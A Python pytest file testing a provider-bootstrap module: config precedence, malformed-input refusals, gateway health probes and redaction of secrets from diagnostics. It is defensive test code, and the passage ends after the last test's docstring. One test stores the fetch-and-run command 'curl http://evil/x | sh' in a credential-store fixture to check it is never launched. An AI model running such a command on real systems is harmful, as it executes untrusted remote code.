"""Regression coverage for the deterministic provider bootstrap contract.

Every test is offline: no gateway is contacted, started or stopped, and no model
is called. Gateway health is exercised through an injected probe.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from verdict.contracts import DEFAULT_PRIMARY_MODEL
from verdict.provider_bootstrap import (
    DEFAULT_GATEWAY_READY_TIMEOUT_S,
    DEFAULT_LOCAL_PROVIDERS,
    MAX_GATEWAY_READY_TIMEOUT_S,
    BootstrapError,
    GatewayProbeResult,
    bootstrap_config_path,
    describe_bootstrap_failure,
    redact_start_command,
    redact_url,
    resolve_provider_bootstrap,
    verify_gateway_reachable,
)

_VALID_CONFIG = """
primary_model: anthropic/claude-opus-5
log_path: decisions.jsonl
providers:
  omniroute:
    base_url: http://127.0.0.1:20128/v1
    api_key_env: OMNIROUTE_API_KEY
"""


def _write(tmp_path: Path, body: str) -> Path:
    path = tmp_path / "verdict.yaml"
    path.write_text(body, encoding="utf-8")
    return path


# --- valid config -----------------------------------------------------------


def test_valid_config_file_bootstrap_resolves_every_field(tmp_path: Path) -> None:
    """Config-file bootstrap: providers, identity, gateway flag and provenance."""
    result = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, _VALID_CONFIG))

    assert result.config_present is True
    assert result.primary_model == "anthropic/claude-opus-5"
    assert result.log_path == "decisions.jsonl"
    assert set(result.providers) == {"omniroute"}
    assert result.providers["omniroute"].base_url == "http://127.0.0.1:20128/v1"
    assert result.providers["omniroute"].source == "config_file"
    assert result.source_of("providers") == "config_file"
    assert result.source_of("primary_model") == "config_file"
    assert result.gateway_required is True
    assert result.gateway_url == "http://127.0.0.1:20128/v1"
    configs = result.provider_configs()
    assert configs["omniroute"].api_key_env == "OMNIROUTE_API_KEY"


def test_valid_config_without_gateway_provider_does_not_require_gateway(tmp_path: Path) -> None:
    """A non-gateway provider set reports gateway_required False for the lifecycle owner."""
    body = "providers:\n  vendor:\n    base_url: https://api.example.test/v1\n"
    result = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))

    assert result.gateway_required is False
    assert result.gateway_url is None


# --- environment-variable bootstrap ----------------------------------------


def test_environment_variable_bootstrap_resolves_gateway_provider(tmp_path: Path) -> None:
    """OMNIROUTE_BASE_URL alone is a complete bootstrap; /v1 is appended once."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"}, config_path=tmp_path / "absent.yaml"
    )

    assert result.config_present is False
    assert result.providers["omniroute"].base_url == "http://127.0.0.1:20128/v1"
    assert result.providers["omniroute"].source == "environment"
    assert result.source_of("gateway_url") == "environment"
    assert result.gateway_required is True
    assert result.gateway_url == "http://127.0.0.1:20128"


def test_environment_bootstrap_reports_missing_credential_without_failing(tmp_path: Path) -> None:
    """A declared api_key_env that is unset is a visible note, not a refusal."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"}, config_path=tmp_path / "absent.yaml"
    )

    codes = {note.code for note in result.notes()}
    assert "credential_env_missing" in codes
    note = next(n for n in result.notes() if n.code == "credential_env_missing")
    assert note.field == "OMNIROUTE_API_KEY"
    assert "verdict credentials set OMNIROUTE_API_KEY" in note.remediation


def test_credential_store_supplies_unset_names_and_is_named_as_the_source(tmp_path: Path) -> None:
    """Exported env wins over the store; store-supplied names report their source."""
    result = resolve_provider_bootstrap(
        env={},
        config_path=tmp_path / "absent.yaml",
        credential_store_env={
            "OMNIROUTE_BASE_URL": "http://127.0.0.1:20128",
            "OMNIROUTE_API_KEY": "token",
        },
    )

    assert result.providers["omniroute"].source == "credential_store"
    assert result.source_of("gateway_url") == "credential_store"
    # Exact note set: the store supplied both names, so no credential note; the
    # identity is still defaulted, which must be announced.
    assert {n.code for n in result.notes()} == {"config_file_missing", "default_primary_model"}


def test_exported_environment_outranks_credential_store(tmp_path: Path) -> None:
    """Precedence: exported environment beats the credential store."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20129"},
        config_path=tmp_path / "absent.yaml",
        credential_store_env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"},
    )

    assert result.gateway_url == "http://127.0.0.1:20129"
    assert result.source_of("gateway_url") == "environment"


# --- missing config ---------------------------------------------------------


def test_missing_config_and_empty_environment_names_field_source_and_fix(tmp_path: Path) -> None:
    """Missing configuration refuses with the exact field and remediation."""
    absent = tmp_path / "absent.yaml"
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=absent)

    exc = excinfo.value
    assert exc.reason_code == "bootstrap_configuration_incomplete"
    assert exc.diagnostic_class == "configuration"
    diagnostic = exc.diagnostics[0]
    assert diagnostic.code == "no_provider_configuration"
    assert diagnostic.field == "providers"
    assert "OMNIROUTE_BASE_URL" in diagnostic.detail
    assert str(absent) in diagnostic.detail
    assert "verdict setup" in diagnostic.remediation
    assert "no provider configuration available" not in str(exc)


def test_empty_config_mapping_is_treated_as_present_but_incomplete(tmp_path: Path) -> None:
    """An empty YAML document is readable but still lacks a provider set."""
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, "\n"))

    assert excinfo.value.diagnostics[0].code == "no_provider_configuration"


# --- malformed config -------------------------------------------------------


def test_malformed_yaml_is_a_named_configuration_failure(tmp_path: Path) -> None:
    """Unparsable YAML is reported, never silently ignored."""
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, "providers: [oops\n"))

    diagnostic = excinfo.value.diagnostics[0]
    assert diagnostic.code == "config_file_unparsable"
    assert diagnostic.diagnostic_class == "configuration"
    assert diagnostic.source == "config_file"


def test_config_that_is_not_a_mapping_is_rejected(tmp_path: Path) -> None:
    """A non-mapping document names the type it found."""
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, "- a\n- b\n"))

    assert excinfo.value.diagnostics[0].code == "config_file_not_mapping"
    assert "list" in excinfo.value.diagnostics[0].detail


def test_malformed_providers_section_is_rejected(tmp_path: Path) -> None:
    """'providers' must be a mapping."""
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, "providers: 7\n"))

    assert excinfo.value.diagnostics[0].code == "config_providers_malformed"
    assert excinfo.value.diagnostics[0].field == "providers"


def test_provider_entry_without_base_url_names_the_exact_field(tmp_path: Path) -> None:
    """A provider missing base_url names providers.<name>.base_url."""
    body = "providers:\n  omniroute:\n    api_key_env: OMNIROUTE_API_KEY\n"
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))

    diagnostic = excinfo.value.diagnostics[0]
    assert diagnostic.code == "provider_base_url_missing"
    assert diagnostic.field == "providers.omniroute.base_url"


def test_provider_base_url_that_is_not_absolute_is_rejected(tmp_path: Path) -> None:
    """A relative or scheme-less base_url is a configuration failure."""
    body = "providers:\n  omniroute:\n    base_url: localhost:20128\n"
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))

    assert excinfo.value.diagnostics[0].code == "provider_base_url_invalid"


def test_malformed_gateway_env_is_rejected_before_execution(tmp_path: Path) -> None:
    """A malformed OMNIROUTE_BASE_URL fails validation, not at request time."""
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(
            env={"OMNIROUTE_BASE_URL": "not-a-url"}, config_path=tmp_path / "absent.yaml"
        )

    diagnostic = excinfo.value.diagnostics[0]
    assert diagnostic.code == "provider_base_url_invalid"
    assert diagnostic.field == "OMNIROUTE_BASE_URL"
    assert diagnostic.source == "environment"


def test_every_malformed_provider_entry_is_reported_together(tmp_path: Path) -> None:
    """All provider faults are collected so one run lists every fix."""
    body = "providers:\n  a: 3\n  b:\n    api_key_env: X\n  c:\n    base_url: nope\n"
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))

    codes = {d.code for d in excinfo.value.diagnostics}
    assert codes == {
        "provider_entry_malformed",
        "provider_base_url_missing",
        "provider_base_url_invalid",
    }


# --- precedence conflicts ---------------------------------------------------


def test_config_providers_outrank_gateway_env_and_conflict_is_reported(tmp_path: Path) -> None:
    """Provider map: config file wins; the disagreement is a visible note."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20129"},
        config_path=_write(tmp_path, _VALID_CONFIG),
    )

    assert result.providers["omniroute"].base_url == "http://127.0.0.1:20128/v1"
    conflict = next(n for n in result.notes() if n.code == "precedence_conflict")
    assert conflict.field == "providers.omniroute.base_url"
    assert "the config file wins for the provider map" in conflict.detail


def test_gateway_url_precedence_is_environment_first(tmp_path: Path) -> None:
    """gateway_url: OMNIROUTE_BASE_URL wins over config gateway_url."""
    body = (
        "gateway_url: http://127.0.0.1:20128\n"
        "providers:\n  vendor:\n    base_url: https://api.example.test/v1\n"
    )
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20129"}, config_path=_write(tmp_path, body)
    )

    assert result.gateway_url == "http://127.0.0.1:20129"
    assert result.source_of("gateway_url") == "environment"


def test_config_gateway_url_is_used_when_environment_is_unset(tmp_path: Path) -> None:
    """With no env override the config gateway_url is authoritative."""
    body = (
        "gateway_url: http://127.0.0.1:20128\n"
        "providers:\n  vendor:\n    base_url: https://api.example.test/v1\n"
    )
    result = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))

    assert result.gateway_url == "http://127.0.0.1:20128"
    assert result.source_of("gateway_url") == "config_file"


def test_primary_model_precedence_is_config_then_environment_then_default(tmp_path: Path) -> None:
    """primary_model: config file, then LLMGATE_PRIMARY, then the built-in default."""
    from verdict.contracts import DEFAULT_PRIMARY_MODEL

    env = {"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128", "LLMGATE_PRIMARY": "vendor/env-model"}
    absent = tmp_path / "absent.yaml"

    from_env = resolve_provider_bootstrap(env=env, config_path=absent)
    assert from_env.primary_model == "vendor/env-model"
    assert from_env.source_of("primary_model") == "environment"

    from_config = resolve_provider_bootstrap(env=env, config_path=_write(tmp_path, _VALID_CONFIG))
    assert from_config.primary_model == "anthropic/claude-opus-5"
    assert from_config.source_of("primary_model") == "config_file"

    from_default = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"}, config_path=absent
    )
    assert from_default.primary_model == DEFAULT_PRIMARY_MODEL
    assert from_default.source_of("primary_model") == "default"


def test_profile_and_log_path_follow_the_same_precedence(tmp_path: Path) -> None:
    """profile/log_path: config file, then environment, then default."""
    env = {
        "OMNIROUTE_BASE_URL": "http://127.0.0.1:20128",
        "LLMGATE_INTELLIGENCE_PROFILE": "staging",
        "LLMGATE_LOG_PATH": "env.jsonl",
    }
    from_env = resolve_provider_bootstrap(env=env, config_path=tmp_path / "absent.yaml")
    assert (from_env.profile, from_env.log_path) == ("staging", "env.jsonl")
    assert from_env.source_of("profile") == "environment"

    from_config = resolve_provider_bootstrap(env=env, config_path=_write(tmp_path, _VALID_CONFIG))
    assert from_config.log_path == "decisions.jsonl"
    assert from_config.source_of("log_path") == "config_file"


# --- defaulted identity -----------------------------------------------------


def test_default_primary_model_is_announced_as_a_non_fatal_note(tmp_path: Path) -> None:
    """A built-in identity is never silent: it names the field, source and fix."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"}, config_path=tmp_path / "absent.yaml"
    )

    assert result.source_of("primary_model") == "default"
    note = next(n for n in result.notes() if n.code == "default_primary_model")
    assert note.fatal is False
    assert note.diagnostic_class == "configuration"
    assert note.field == "primary_model"
    assert note.source == "default"
    assert DEFAULT_PRIMARY_MODEL in note.detail
    assert "LLMGATE_PRIMARY" in note.remediation


def test_default_primary_model_is_still_announced_under_require_authoritative(
    tmp_path: Path,
) -> None:
    """Authoritative bootstrap reports the defaulted identity; it does not refuse."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"},
        config_path=tmp_path / "absent.yaml",
        require_authoritative=True,
    )

    assert result.primary_model == DEFAULT_PRIMARY_MODEL
    assert "default_primary_model" in {n.code for n in result.notes()}


def test_a_configured_primary_model_emits_no_default_note(tmp_path: Path) -> None:
    """The note fires only for the built-in default, from config or environment."""
    from_config = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, _VALID_CONFIG))
    assert "default_primary_model" not in {n.code for n in from_config.notes()}

    from_env = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128", "LLMGATE_PRIMARY": "vendor/model"},
        config_path=tmp_path / "absent.yaml",
    )
    assert "default_primary_model" not in {n.code for n in from_env.notes()}


# --- default providers: visible in dev, forbidden in production -------------


def test_default_providers_are_not_offered_unless_the_caller_opts_in(tmp_path: Path) -> None:
    """No silent fallback: default providers require an explicit opt-in."""
    with pytest.raises(BootstrapError):
        resolve_provider_bootstrap(env={}, config_path=tmp_path / "absent.yaml")


def test_default_providers_for_interactive_use_are_reported_not_silent(tmp_path: Path) -> None:
    """Opted-in defaults set field_sources['providers'] and emit a diagnostic."""
    result = resolve_provider_bootstrap(
        env={}, config_path=tmp_path / "absent.yaml", allow_default_providers=True
    )

    assert set(result.providers) == set(DEFAULT_LOCAL_PROVIDERS)
    assert result.source_of("providers") == "default"
    assert all(b.source == "default" for b in result.providers.values())
    note = next(n for n in result.notes() if n.code == "default_provider_fallback")
    assert note.diagnostic_class == "configuration"
    assert "public_ollama" in note.detail
    assert "OMNIROUTE_BASE_URL" in note.remediation


def test_default_providers_are_forbidden_under_the_production_profile(tmp_path: Path) -> None:
    """profile=production refuses a defaulted provider set as a configuration failure."""
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(
            env={"LLMGATE_INTELLIGENCE_PROFILE": "production"},
            config_path=tmp_path / "absent.yaml",
            allow_default_providers=True,
        )

    diagnostic = excinfo.value.diagnostics[0]
    assert diagnostic.code == "default_providers_forbidden"
    assert diagnostic.diagnostic_class == "configuration"
    assert "profile=production" in diagnostic.detail


def test_default_providers_are_forbidden_when_authoritative_execution_is_required(
    tmp_path: Path,
) -> None:
    """require_authoritative refuses defaults even under the development profile."""
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(
            env={},
            config_path=tmp_path / "absent.yaml",
            allow_default_providers=True,
            require_authoritative=True,
        )

    assert excinfo.value.diagnostics[0].code == "default_providers_forbidden"


def test_production_profile_still_accepts_a_configured_provider_set(tmp_path: Path) -> None:
    """Production is only strict about defaults, not about valid configuration."""
    result = resolve_provider_bootstrap(
        env={"LLMGATE_INTELLIGENCE_PROFILE": "production"},
        config_path=_write(tmp_path, _VALID_CONFIG),
        allow_default_providers=True,
        require_authoritative=True,
    )

    assert result.profile == "production"
    assert result.source_of("providers") == "config_file"


# --- unavailable provider / gateway health ----------------------------------


def test_gateway_required_with_gateway_absent_is_reported_not_started(tmp_path: Path) -> None:
    """An absent gateway is a gateway_health diagnostic; nothing is launched."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"}, config_path=tmp_path / "absent.yaml"
    )
    calls: list[str] = []

    def probe(url: str) -> GatewayProbeResult:
        calls.append(url)
        return GatewayProbeResult(reachable=False, detail="connection refused")

    diagnostic = verify_gateway_reachable(result, probe=probe)

    assert calls == ["http://127.0.0.1:20128"]
    assert diagnostic is not None
    assert diagnostic.code == "gateway_unreachable"
    assert diagnostic.diagnostic_class == "gateway_health"
    assert diagnostic.field == "gateway_url"
    assert "connection refused" in diagnostic.detail
    assert "verdict detect" in diagnostic.remediation


def test_unavailable_provider_probe_exception_is_gateway_health_not_configuration(
    tmp_path: Path,
) -> None:
    """A raising probe is still classified as gateway health, never configuration."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"}, config_path=tmp_path / "absent.yaml"
    )

    def probe(url: str) -> GatewayProbeResult:
        raise OSError("no route to host")

    diagnostic = verify_gateway_reachable(result, probe=probe)

    assert diagnostic is not None
    assert diagnostic.diagnostic_class == "gateway_health"
    assert "no route to host" in diagnostic.detail


def test_healthy_gateway_yields_no_diagnostic(tmp_path: Path) -> None:
    """Provider inventory verified before admission returns a clean result."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"}, config_path=tmp_path / "absent.yaml"
    )

    assert verify_gateway_reachable(result, probe=lambda _: GatewayProbeResult(True)) is None


def test_no_gateway_required_skips_the_probe_entirely(tmp_path: Path) -> None:
    """A non-gateway provider set never triggers a gateway probe."""
    body = "providers:\n  vendor:\n    base_url: https://api.example.test/v1\n"
    result = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))
    calls: list[str] = []

    def probe(url: str) -> GatewayProbeResult:
        calls.append(url)
        return GatewayProbeResult(True)

    assert verify_gateway_reachable(result, probe=probe) is None
    assert calls == []


# --- deterministic error reporting ------------------------------------------


def test_bootstrap_failure_description_is_deterministic(tmp_path: Path) -> None:
    """Two identical failures render byte-identical operator reports."""
    absent = tmp_path / "absent.yaml"
    reports = []
    for _ in range(2):
        try:
            resolve_provider_bootstrap(env={}, config_path=absent)
        except BootstrapError as exc:
            reports.append(describe_bootstrap_failure(exc))

    assert reports[0] == reports[1]
    assert reports[0].startswith("bootstrap_configuration_incomplete (configuration)")
    assert "field=providers" in reports[0]
    assert "remediation:" in reports[0]


def test_diagnostic_classes_are_disjoint_across_failure_kinds(tmp_path: Path) -> None:
    """Configuration, gateway health and eligibility never share a class."""
    try:
        resolve_provider_bootstrap(env={}, config_path=tmp_path / "absent.yaml")
    except BootstrapError as exc:
        config_class = exc.diagnostic_class

    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"}, config_path=tmp_path / "absent.yaml"
    )
    health = verify_gateway_reachable(result, probe=lambda _: GatewayProbeResult(False, "down"))

    assert config_class == "configuration"
    assert health is not None
    assert health.diagnostic_class == "gateway_health"
    assert config_class != health.diagnostic_class


def test_result_serialization_is_stable_and_secret_free(tmp_path: Path) -> None:
    """to_dict exposes env names and sources, never secret values."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_API_KEY": "super-secret"}, config_path=_write(tmp_path, _VALID_CONFIG)
    )
    payload = result.to_dict()

    assert payload["gateway_required"] is True
    assert payload["providers"]["omniroute"]["api_key_env"] == "OMNIROUTE_API_KEY"
    assert "super-secret" not in repr(payload)
    assert result.to_dict() == payload


# --- secret redaction -------------------------------------------------------

_SECRET_URL_CONFIG = """
providers:
  omniroute:
    base_url: http://u:SECRETPW@127.0.0.1:20128/v1
    api_key_env: OMNIROUTE_API_KEY
"""


def test_url_userinfo_is_redacted_in_serialization(tmp_path: Path) -> None:
    """A password embedded in a base URL never reaches to_dict output."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_API_KEY": "k"}, config_path=_write(tmp_path, _SECRET_URL_CONFIG)
    )
    payload = result.to_dict()

    assert "SECRETPW" not in repr(payload)
    assert payload["providers"]["omniroute"]["base_url"] == "http://***:***@127.0.0.1:20128/v1"
    assert payload["gateway_url"] == "http://***:***@127.0.0.1:20128/v1"
    # The runtime binding still carries the real credential for execution.
    assert result.providers["omniroute"].base_url == "http://u:SECRETPW@127.0.0.1:20128/v1"


def test_url_userinfo_is_redacted_in_the_precedence_conflict_note(tmp_path: Path) -> None:
    """Neither the config URL nor the env URL leaks its password into the note."""
    result = resolve_provider_bootstrap(
        env={
            "OMNIROUTE_BASE_URL": "http://envuser:ENVSECRET@127.0.0.1:20129",
            "OMNIROUTE_API_KEY": "k",
        },
        config_path=_write(tmp_path, _SECRET_URL_CONFIG),
    )

    note = next(n for n in result.notes() if n.code == "precedence_conflict")
    assert "SECRETPW" not in note.describe()
    assert "ENVSECRET" not in note.describe()
    assert "***:***@" in note.detail
    assert "SECRETPW" not in repr(result.to_dict())


def test_url_userinfo_is_redacted_in_an_invalid_url_refusal(tmp_path: Path) -> None:
    """A malformed URL carrying a password is named without echoing the password."""
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(
            env={"OMNIROUTE_BASE_URL": "ftp://u:SECRETPW@host/v1"},
            config_path=tmp_path / "absent.yaml",
        )

    diagnostic = excinfo.value.diagnostics[0]
    assert diagnostic.code == "provider_base_url_invalid"
    assert "SECRETPW" not in diagnostic.describe()
    assert "SECRETPW" not in str(excinfo.value)
    assert "SECRETPW" not in describe_bootstrap_failure(excinfo.value)
    assert "SECRETPW" not in repr(excinfo.value.to_dict())


def test_url_userinfo_is_redacted_in_gateway_health_diagnostics(tmp_path: Path) -> None:
    """A gateway-health report quotes the URL and the probe error, both redacted."""
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_API_KEY": "k"}, config_path=_write(tmp_path, _SECRET_URL_CONFIG)
    )

    def _raises(url: str) -> GatewayProbeResult:
        raise ConnectionError(f"cannot connect to {url}")

    failed = verify_gateway_reachable(result, probe=_raises)
    assert failed is not None
    assert "SECRETPW" not in failed.describe()

    unhealthy = verify_gateway_reachable(
        result, probe=lambda url: GatewayProbeResult(reachable=False, detail=f"503 from {url}")
    )
    assert unhealthy is not None
    assert "SECRETPW" not in unhealthy.describe()


def test_unparsable_config_reports_position_without_echoing_the_source_line(tmp_path: Path) -> None:
    """A syntax fault gives line and column, never the offending YAML text."""
    body = "providers:\n  omniroute:\n    base_url: http://u:SECRETPW@h/v1\n  [oops\n"
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))

    diagnostic = excinfo.value.diagnostics[0]
    assert diagnostic.code == "config_file_unparsable"
    assert "line 5" in diagnostic.detail
    assert "column 1" in diagnostic.detail
    assert "SECRETPW" not in describe_bootstrap_failure(excinfo.value)
    assert "base_url" not in diagnostic.detail


def test_redact_url_leaves_credential_free_urls_untouched() -> None:
    """Redaction is limited to userinfo; ordinary URLs render verbatim."""
    assert redact_url("http://127.0.0.1:20128/v1") == "http://127.0.0.1:20128/v1"
    assert redact_url("not-a-url") == "not-a-url"
    assert redact_url("") == ""


def test_bootstrap_error_requires_at_least_one_diagnostic() -> None:
    """The refusal type cannot be constructed without a named cause."""
    with pytest.raises(ValueError, match="at least one diagnostic"):
        BootstrapError("x", ())


def test_bootstrap_config_path_follows_xdg_then_home(tmp_path: Path) -> None:
    """The canonical config path honours XDG_CONFIG_HOME, else ~/.config."""
    xdg = bootstrap_config_path({"XDG_CONFIG_HOME": str(tmp_path)})
    assert xdg == tmp_path / "verdict" / "verdict.yaml"

    fallback = bootstrap_config_path({}, home=tmp_path)
    assert fallback == tmp_path / ".config" / "verdict" / "verdict.yaml"


def test_unparsable_config_never_echoes_a_secret_on_the_rejected_line(tmp_path: Path) -> None:
    """The YAML parser quotes the offending line; that text must never be rendered."""
    body = "providers:\n  omniroute:\n    base_url: [http://u:SECRETPW@h/v1\n"
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))

    diagnostic = excinfo.value.diagnostics[0]
    assert diagnostic.code == "config_file_unparsable"
    assert "SECRETPW" not in diagnostic.detail
    assert "SECRETPW" not in describe_bootstrap_failure(excinfo.value)
    assert "SECRETPW" not in repr(excinfo.value.to_dict())


def test_redact_url_handles_an_at_sign_inside_the_password() -> None:
    """A raw '@' in the password is still fully redacted."""
    assert redact_url("http://user:p@ss@127.0.0.1:20128/v1") == "http://***:***@127.0.0.1:20128/v1"
    assert redact_url("see http://a:b@c@h/x and more") == "see http://***:***@h/x and more"


# --- gateway lifecycle inputs ------------------------------------------------


_LIFECYCLE_CONFIG = """
providers:
  omniroute:
    base_url: http://127.0.0.1:20128/v1
    api_key_env: OMNIROUTE_API_KEY
gateway_start_command: [omniroute, serve, --port, '20128']
gateway_ready_timeout_s: 12.5
"""


def test_lifecycle_fields_default_to_absent_command_and_bounded_timeout(tmp_path: Path) -> None:
    """A start command is never invented; the readiness budget is always bounded."""
    result = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, _VALID_CONFIG))

    assert result.gateway_start_command is None
    assert result.gateway_ready_timeout_s == DEFAULT_GATEWAY_READY_TIMEOUT_S
    assert result.source_of("gateway_ready_timeout_s") == "default"
    assert result.source_of("gateway_start_command") is None


def test_lifecycle_fields_from_the_config_file_record_their_source(tmp_path: Path) -> None:
    """A YAML sequence is taken element-wise, so no shell parsing is involved."""
    result = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, _LIFECYCLE_CONFIG))

    assert result.gateway_start_command == ("omniroute", "serve", "--port", "20128")
    assert result.source_of("gateway_start_command") == "config_file"
    assert result.gateway_ready_timeout_s == 12.5
    assert result.source_of("gateway_ready_timeout_s") == "config_file"


def test_lifecycle_fields_from_the_environment_are_split_into_argv(tmp_path: Path) -> None:
    """The env form is shlex-split into an argv list; quoting is honoured."""
    result = resolve_provider_bootstrap(
        env={
            "OMNIROUTE_BASE_URL": "http://127.0.0.1:20128",
            "VERDICT_GATEWAY_START_COMMAND": "omniroute serve --flag 'two words'",
            "VERDICT_GATEWAY_READY_TIMEOUT_S": "7",
        },
        config_path=tmp_path / "absent.yaml",
    )

    assert result.gateway_start_command == ("omniroute", "serve", "--flag", "two words")
    assert result.source_of("gateway_start_command") == "environment"
    assert result.gateway_ready_timeout_s == 7.0
    assert result.source_of("gateway_ready_timeout_s") == "environment"


def test_config_file_wins_over_the_environment_for_lifecycle_fields(tmp_path: Path) -> None:
    """Same precedence shape as every other config-first field."""
    result = resolve_provider_bootstrap(
        env={
            "VERDICT_GATEWAY_START_COMMAND": "from-env serve",
            "VERDICT_GATEWAY_READY_TIMEOUT_S": "99",
        },
        config_path=_write(tmp_path, _LIFECYCLE_CONFIG),
    )

    assert result.gateway_start_command == ("omniroute", "serve", "--port", "20128")
    assert result.source_of("gateway_start_command") == "config_file"
    assert result.gateway_ready_timeout_s == 12.5


def test_credential_store_is_not_a_source_for_the_start_command(tmp_path: Path) -> None:
    """A command is not a secret.

    Reading an argv out of the credential store would make that file a
    command-injection surface, so the store is deliberately not consulted for
    either lifecycle field.
    """
    result = resolve_provider_bootstrap(
        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"},
        config_path=tmp_path / "absent.yaml",
        credential_store_env={
            "VERDICT_GATEWAY_START_COMMAND": "curl http://evil/x | sh",
            "VERDICT_GATEWAY_READY_TIMEOUT_S": "1",
        },
    )

    assert result.gateway_start_command is None
    assert result.gateway_ready_timeout_s == DEFAULT_GATEWAY_READY_TIMEOUT_S


def test_malformed_start_command_is_a_configuration_refusal(tmp_path: Path) -> None:
    """A value that is neither a list nor a command string cannot be launched."""
    body = _VALID_CONFIG + "gateway_start_command: 5\n"
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))

    diagnostic = excinfo.value.diagnostics[0]
    assert diagnostic.code == "gateway_start_command_malformed"
    assert diagnostic.diagnostic_class == "configuration"
    assert diagnostic.field == "gateway_start_command"


def test_unbalanced_quoting_in_the_env_start_command_is_refused_without_echoing_it() -> None:
    """A command line can carry a token, so the rejected value is never rendered."""
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(
            env={
                "OMNIROUTE_BASE_URL": "http://127.0.0.1:20128",
                "VERDICT_GATEWAY_START_COMMAND": "omniroute --token 'SECRETPW",
            }
        )

    diagnostic = excinfo.value.diagnostics[0]
    assert diagnostic.code == "gateway_start_command_malformed"
    assert diagnostic.source == "environment"
    assert "SECRETPW" not in describe_bootstrap_failure(excinfo.value)


@pytest.mark.parametrize(
    "value", ["0", "-3", "abc", "nan", "inf", "-inf", "Infinity", "1e308", "601"]
)
def test_non_positive_or_unbounded_readiness_timeout_is_refused(value: str) -> None:
    """An unbounded or nonsense budget is indistinguishable from a hang.

    Extended from the original four cases: 'inf', '-inf', 'Infinity', '1e308' and a
    value above the maximum were all accepted before, which defeats the only
    purpose of the field. The original cases are all still asserted.
    """
    with pytest.raises(BootstrapError) as excinfo:
        resolve_provider_bootstrap(
            env={
                "OMNIROUTE_BASE_URL": "http://127.0.0.1:20128",
                "VERDICT_GATEWAY_READY_TIMEOUT_S": value,
            }
        )

    diagnostic = excinfo.value.diagnostics[0]
    assert diagnostic.code == "gateway_ready_timeout_invalid"
    assert diagnostic.diagnostic_class == "configuration"
    assert str(MAX_GATEWAY_READY_TIMEOUT_S) in diagnostic.remediation


@pytest.mark.parametrize("value", ["0.5", "30", "600"])
def test_a_finite_bounded_readiness_timeout_is_accepted(value: str) -> None:
    """The boundary itself is usable; only past it is a refusal."""
    result = resolve_provider_bootstrap(
        env={
            "OMNIROUTE_BASE_URL": "http://127.0.0.1:20128",
            "VERDICT_GATEWAY_READY_TIMEOUT_S": value,
        }
    )

    assert result.gateway_ready_timeout_s == float(value)
    assert result.gateway_ready_timeout_s <= MAX_GATEWAY_READY_TIMEOUT_S


def test_lifecycle_fields_are_serialized_for_receipts(tmp_path: Path) -> None:
    """``to_dict`` records the lifecycle inputs without echoing the argv.

    Rewritten: the original asserted that ``to_dict`` emits the start command
    verbatim as a list. That is wrong, and this module's own
    ``_parse_start_command`` docstring says why -- "a start command can carry a
    token" -- while ``to_dict`` output reaches receipts, structured logs and
    ``--json``. A receipt needs to record which gateway binary was configured and
    where the value came from, not the arguments it was given.

    This asserts everything the old test did (the command is recorded, the timeout
    is recorded, the source is recorded) and adds the stricter requirement: no
    argument survives serialization, and the argument count is disclosed instead.
    The runtime tuple is untouched, which the launch assertions elsewhere cover.
    """
